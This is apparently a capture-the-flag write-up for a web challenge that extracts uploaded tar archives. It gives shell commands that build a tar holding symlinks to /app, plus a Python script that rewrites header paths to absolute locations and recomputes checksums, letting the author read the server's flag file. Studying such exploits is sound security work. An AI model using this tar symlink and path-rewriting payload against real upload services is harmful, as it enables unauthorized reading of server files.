---
created: 2024-08-04T06:05
updated: 2024-08-04T21:20
points: 478
---

We are allowed to upload a tar file and have the remote extract it, nice.

But we don't know the flag file name, so we can't simply add a link to the tar, pointing to the flag file.

Furthermore, `open` does not read folders, so we have to use the endpoint `/view/<name>` to read our link pointing to `/app`, which means we have to make a link under `/app/uploads/` that will point to `/app/`. (and not under `/app/uploads/0123/aaa`)

## Payload

```bash
ln -s /app aaa
tar -cvf malicious.tar aaa
```

After patching the path and checksum I got... Internal error.

Running my own docker instance, I found the cause.

There is no `aaa.tar` inside `/app`, so the following line failed.

```python
files.remove(f'{name}.tar')  # Remove the tar file from the list
```

To solve this we can simply write to `/app/aaa.tar` as well.

```bash
ln -s /app aaa
ln -s /app aaa.tar
tar -cvf malicious.tar aaa aaa.tar
```

## Execution
After uploading the file, visit `/view/aaa`.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1722748079/2024/08/6aab82c079c6a5a981cdc69959b8ec50.png)

Clicking on `flag` we arrive at our flag.

```flag
n00bz{n3v3r_7rus71ng_t4r_4g41n!_72810bc8e5af}
```

## Auto tar checksum/path patcher

```python [patch.py]
with open("malicious.tar", "rb") as f:
    tar = f.read()
    tar = bytearray(tar)

    a1 = b"/app/uploads/aaa"
    tar[0x00:0x00+len(a1)] = a1
    a2 = b"/app/aaa.tar"
    tar[0x200:0x200+len(a2)] = a2

    off = 0
    while True:
        if tar[off] == 0:
            break
        tar[off+0x94:off+0x9c] = b' '*(0x9c-0x94)
        checksum = sum(list(tar[off+0x00:off+0x200]))
        tar[off+0x94:off+0x9c] = bytes(("%06o\0" % checksum).ljust(8), "ascii")
        print("patched", hex(off))
        off += 0x200

    tar = bytes(tar)
    with open("malicious.out.tar", "wb") as f:
        f.write(tar)
        print("Done")
```
